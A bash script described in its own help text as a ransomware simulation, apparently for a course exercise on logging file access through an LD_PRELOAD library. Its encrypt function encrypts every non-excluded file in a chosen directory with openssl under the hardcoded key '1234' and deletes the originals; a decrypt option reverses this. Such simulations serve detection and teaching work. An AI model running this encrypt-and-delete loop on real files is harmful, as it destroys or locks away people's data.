#!/bin/bash

#direct="$1/test";
#echo "directory: $direct";

let num=0
direct=""

function create(){

    LD_PRELOAD=./logger.so ./file_open "$direct" "$num" 
    exit 0
   
}

function encrypt(){
  for i in  $direct/*; 
  do 


    if [[ "$i" != *".encrypt"* ]] && [[ "$i" != *".c"* ]] && [[ "$i" != *".sh"* ]] && [[ "$i" != *".junk"* ]]  && [[ "$i" != *".so"* ]] &&  [[ "$i" != "$direct/README" ]] \
        &&  [[ "$i" != "$direct/acmonitor" ]]  &&  [[ "$i" != "$direct/Makefile" ]]  &&  [[ "$i" != "$direct/file_open" ]]  &&  [[ "$i" != "$direct/test_aclog" ]] ; then 
  
    LD_PRELOAD=./logger.so openssl aes-256-cbc -pbkdf2 -a -salt -in $i -out $i.encrypt -k 1234
    rm $i
  
    fi
  done

  exit 0
}

function decrypt(){

  for i in  $direct/*; 
  do 


    if [[ "$i" == *".encrypt"* ]]; then
    filename="${i%.*}"
    LD_PRELOAD=./logger.so  openssl aes-256-cbc -pbkdf2 -a -salt -in $i -out $filename -d -k 1234
    rm $i

    fi

  done
  exit 0
}

function usage(){
    printf  "Usage: \n"
    printf -- "-n   the number of files to be created for the simulation of the renasomware \n"
    printf -- "-d   the directory in which they will be put\n"
    printf -- "-e   encrypt EVERYTHING under that directory (except from the executable files)\n"
    printf -- "-p   decrypt encrypted files under that directory\n"
    printf -- "-h  This help message\n\n"
    printf "How to run this program:\n"
    printf "./ransomware -d dir -n N  --> for file creation\n"
    printf "./ransomware -e dir       --> for file encryption\n"
    printf "./ransomware -p dir       --> for file decryption\n"

    exit
}



if [[ $# -eq 0 ]];then
    usage
fi

while [[ ! -z "$1" ]]; do

    if [[ "$1" == "-n" ]];then
        num="$2"
        shift
    elif [[ "$1" == "-d" ]] ;then
        direct="$2"
        shift
    elif [[ "$1" == "-e" ]] ;then
        direct="$2"
        encrypt
    elif [[ "$1" == "-p" ]] ;then
        direct="$2"
        decrypt
    elif [[ "$1" == "-h" ]] ;then
        usage
    fi
    shift
done

if  [[ "$direct" == "" ]] || [[ $num -lt 1 ]];then
    usage
fi

create